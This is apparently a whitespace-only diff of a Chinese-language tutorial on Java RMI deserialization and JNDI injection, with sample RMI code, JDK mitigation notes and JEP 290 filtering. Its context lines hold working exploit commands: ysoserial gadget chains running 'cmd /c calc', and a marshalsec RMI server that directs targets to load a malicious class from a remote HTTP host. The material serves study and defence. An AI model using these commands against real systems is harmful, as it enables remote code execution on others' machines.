@@ -66,7 +66,6 @@ import java.rmi.RemoteException;
 public interface HelloInterface extends Remote {
     String hello(String age) throws RemoteException;
 }
-
 ```
 
 
@@ -88,7 +87,6 @@ public class HelloImp extends UnicastRemoteObject implements HelloInterface{
         return "hello" +" " + age;
     }
 }
-
 ```
 
 
@@ -113,7 +111,6 @@ public class RMIServer {
         }
     }
 }
-
 ```
 
 
@@ -142,7 +139,6 @@ public class RMIclient {
         }
     }
 }
-
 ```
 
 
@@ -213,7 +209,6 @@ public class RmiServer {
 
     }
 }
-
 ```
 
 
@@ -240,7 +235,6 @@ if (String.class == clazz
 } else {
     return ObjectInputFilter.Status.REJECTED;
 }
-
 ```
 
 
@@ -264,13 +258,11 @@ vulhub上也有对应的靶场：[rmi-registry-bind-deserialization-bypass](http
 
 ```java
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 "cmd /c calc"
-
 ```
 
 
 ```java
 java -cp ysoserial-0.0.6-bit4woo-all.jar ysoserial.exploit.RMIRegistryExploitJdk8u231 127.0.0.1 1099 JRMPClient2 127.0.0.1:9999
-
 ```
 
 
@@ -338,7 +330,6 @@ import java.rmi.RemoteException;
 public interface IHello extends Remote {
     public Person sayHello()throws RemoteException;
 }
-
 ```
 
 
@@ -365,7 +356,6 @@ public class HelloImpl extends UnicastRemoteObject implements IHello {
         return;
     }
 }
-
 ```
 
 
@@ -380,7 +370,6 @@ public class RMICustomer {
 
     }
 }
-
 ```
 
 
@@ -401,7 +390,6 @@ public class RMICustomer {
 - 攻击者控制uri参数为上一步开启的恶意 RMI 服务器地址
 - 恶意RMI服务器返回 ReferenceWrapper 类
 - 目标（Client) 在执行lookup操作的时候，在decodeObject 中将ReferenceWrapper 变为 Reference 类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码。
-
 ```
 
 
@@ -436,7 +424,6 @@ public class SERVER {
 
     }
 }
-
 ```
 
 
@@ -459,7 +446,6 @@ public class CLIENT {
         ctx.lookup(uri);
     }
 }
-
 ```
 
 
@@ -480,7 +466,6 @@ public class ExecTest {
         }
     }
 }
-
 ```
 
 
@@ -496,7 +481,6 @@ JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为t
 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
 
 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。
-
 ```
 
 
@@ -511,13 +495,11 @@ JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCode
 
 ```java
 java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
-
 ```
 
 
 ```java
 java -cp marshalsec-0.0.3-all.jar marshalsec.jndi.RMIRefServer http://1.14.47.152:8081/#ExecTest 1099
-
 ```
 
 
@@ -541,7 +523,6 @@ java -cp marshalsec-0.0.3-all.jar marshalsec.jndi.RMIRefServer http://1.14.47.15
 2、限制反序列化的深度和复杂度。
 3、为RMI远程调用对象提供了一个验证类的机制。
 4、定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。
-
 ```
 
 
@@ -552,7 +533,6 @@ JEP290本来是JDK9的新特性，但为了安全性之类的理由还将其移�
 Java™ SE Development Kit 8, Update 121 (JDK 8u121)
 Java™ SE Development Kit 7, Update 131 (JDK 7u131)
 Java™ SE Development Kit 6, Update 141 (JDK 6u141)
-
 ```
 
 
